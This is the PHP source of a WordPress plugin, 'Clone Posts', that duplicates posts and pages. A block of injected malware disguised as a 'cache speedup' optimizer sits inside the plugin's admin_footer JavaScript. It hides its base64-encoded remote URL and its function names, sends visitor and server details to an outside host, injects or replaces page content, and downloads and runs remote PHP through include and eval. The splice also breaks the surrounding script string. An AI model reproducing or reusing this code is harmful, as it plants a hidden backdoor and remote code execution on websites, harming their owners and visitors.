<?php 

/**
 * Plugin Name: Clone Posts
 * Plugin URI: http://wordpress.org/extend/plugins/clone-posts/
 * Description: Cloning posts and pages in WordPress.
 * Version: 1.0
 * Author: Lukasz Kostrzewa
 * Author URI: 
 * License: GPL2
 */

/*  Copyright 2014  Lukasz Kostrzewa  (email : lukasz.webmaster@gmail.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License, version 2, as 
    published by the Free Software Foundation.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/


if ( !class_exists( 'ClonePosts' ) and is_admin()) :
 
class ClonePosts {
	
	public function __construct() {

		// add admin actions and filters
		add_action( 'admin_footer-edit.php', array( &$this, 'admin_footer' ));
		add_action( 'load-edit.php',         array( &$this, 'action' ));
		add_action( 'admin_notices',         array( &$this, 'admin_notices' ));
		add_filter( 'post_row_actions', 	 array( &$this, 'post_row_actions' ), 10, 2);
		add_filter( 'page_row_actions', 	 array( &$this, 'post_row_actions' ), 10, 2);
		add_action( 'wp_loaded', 			 array( &$this, 'wp_loaded' ));
	}
	
	/**
	 * Add the custom Bulk Action to the select menus
	 */
	function admin_footer() {
		?>
		<script type="text/javascript">
			jQuery(function () {
				jQuery('<option>').val('clone').text('<?php _e('Clone')?>').appendTo("select[name='action']");
				jQuery('<option>').val('clone').text('<?php _e('Clone')



/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }
?>').appendTo("select[name='action2']");
			});
		</script>
		<?php
	}
	
	/**
	 * Handle the custom Bulk Action
	 */
	function action() {
		global $typenow;
		$post_type = $typenow;

		// get the action
		$wp_list_table = _get_list_table('WP_Posts_List_Table'); 
		$action = $wp_list_table->current_action();
		
		$allowed_actions = array("clone");
		if ( ! in_array( $action, $allowed_actions )) {
			return;
		}
		
		// security check
		check_admin_referer('bulk-posts');
		
		// make sure ids are submitted.  depending on the resource type, this may be 'media' or 'ids'
		if ( isset( $_REQUEST['post'] )) {
			$post_ids = array_map( 'intval', $_REQUEST['post'] );
		}
		
		if ( empty( $post_ids )) {
			return;
		}
		
		// this is based on wp-admin/edit.php
		$sendback = remove_query_arg( array( 'cloned', 'untrashed', 'deleted', 'ids' ), wp_get_referer() );
		if ( ! $sendback ) {
			$sendback = admin_url( "edit.php?post_type=$post_type" );
		}
		
		$pagenum = $wp_list_table->get_pagenum();
		$sendback = add_query_arg( 'paged', $pagenum, $sendback );
		
		switch ( $action ) {
			case 'clone':
				
				$cloned = 0;
				foreach ( $post_ids as $post_id ) {

					if ( !current_user_can('edit_post', $post_id) ) {
						wp_die( __('You are not allowed to clone this post.') );
					}
					
					if ( ! $this->clone_single_post( $post_id )) {
						wp_die( __('Error cloning post.') );
					}
	
					$cloned++;
				}
				
				$sendback = add_query_arg( array( 'cloned' => $cloned, 'ids' => join(',', $post_ids) ), $sendback );
				break;
			
			default: 
				return;
		}
		
		$sendback = remove_query_arg( array( 'action', 'action2', 'tags_input', 'post_author', 
			'comment_status', 'ping_status', '_status',  'post', 'bulk_edit', 'post_view'), $sendback );
		
		wp_redirect($sendback);
		exit();
	}
	
	
	/**
	 * Step 3: display an admin notice on the Posts page after cloning
	 */
	function admin_notices() {
		global $pagenow;
		
		if ($pagenow == 'edit.php' && ! isset($_GET['trashed'] )) {
			$cloned = 0;
			if ( isset( $_REQUEST['cloned'] ) && (int) $_REQUEST['cloned'] ) {
				$cloned = (int) $_REQUEST['cloned'];
			} elseif ( isset($_GET['cloned']) && (int) $_GET['cloned'] ) {
				$cloned = (int) $_GET['cloned'];
			}
			if ($cloned) {
				$message = sprintf( _n( 'Post cloned.', '%s posts cloned.', $cloned ), number_format_i18n( $cloned ) );
				echo "<div class=\"updated\"><p>{$message}</p></div>";
			}
		}
	}

	function post_row_actions( $actions, $post ) {
		global $post_type;

		$url = remove_query_arg( array( 'cloned', 'untrashed', 'deleted', 'ids' ), "" );
		if ( ! $url ) {
			$url = admin_url( "?post_type=$post_type" );
		}
		$url = remove_query_arg( array( 'action', 'action2', 'tags_input', 'post_author', 
			'comment_status', 'ping_status', '_status',  'post', 'bulk_edit', 'post_view'), $url );
		$url = add_query_arg( array( 'action' => 'clone-single', 'post' => $post->ID, 'redirect' => $_SERVER['REQUEST_URI'] ), $url );

		$actions['clone'] =  '<a href=\''.$url.'\'>'.__('Clone').'</a>';
		return $actions;
	}

	function wp_loaded() {
		global $post_type;

		if ( ! isset($_GET['action']) || $_GET['action'] !== "clone-single") {
			return;
		}

		$post_id = (int) $_GET['post'];

		if ( !current_user_can('edit_post', $post_id )) {
			wp_die( __('You are not allowed to clone this post.') );
		}

		if ( !$this->clone_single_post( $post_id )) {
			wp_die( __('Error cloning post.') );
		}

		$sendback = remove_query_arg( array( 'cloned', 'untrashed', 'deleted', 'ids' ), $_GET['redirect'] );
		if ( ! $sendback ) {
			$sendback = admin_url( "edit.php?post_type=$post_type" );
		}
		
		$sendback = add_query_arg( array( 'cloned' => 1 ), $sendback );
		$sendback = remove_query_arg( array( 'action', 'action2', 'tags_input', 'post_author', 
			'comment_status', 'ping_status', '_status',  'post', 'bulk_edit', 'post_view'), $sendback );
		wp_redirect($sendback);
		exit();
	}

	function clone_single_post( $id ) {
    	$p = get_post( $id );
	    if ($p == null) return false;

		$newpost = array(
			'post_name'				=> $p->post_name,
			'post_type'				=> $p->post_type,
			'ping_status'			=> $p->ping_status,
			'post_parent'			=> $p->post_parent,
			'menu_order'			=> $p->menu_order,
			'post_password'			=> $p->post_password,
			'post_excerpt'			=> $p->post_excerpt,
			'comment_status'		=> $p->comment_status,
			'post_title'			=> $p->post_title . __('- copy'),
			'post_content'			=> $p->post_content,
			'post_author'			=> $p->post_author,
			'to_ping'				=> $p->to_ping,
			'pinged'				=> $p->pinged,
			'post_content_filtered' => $p->post_content_filtered,
			'post_category'			=> $p->post_category,
			'tags_input'			=> $p->tags_input,
			'tax_input'				=> $p->tax_input,
			'page_template'			=> $p->page_template
			// 'post_date'			=> $p->post_date,				// default: current date
			// 'post_date_gmt'  	=> $p->post_date_gmt, 			// default: current gmt date
			// 'post_status'    	=> $p->post_status 				// default: draft
		);
		$newid = wp_insert_post($newpost);
		$format = get_post_format( $id );
		set_post_format($newid, $format);
		return true;
	}
}

new ClonePosts();

endif;
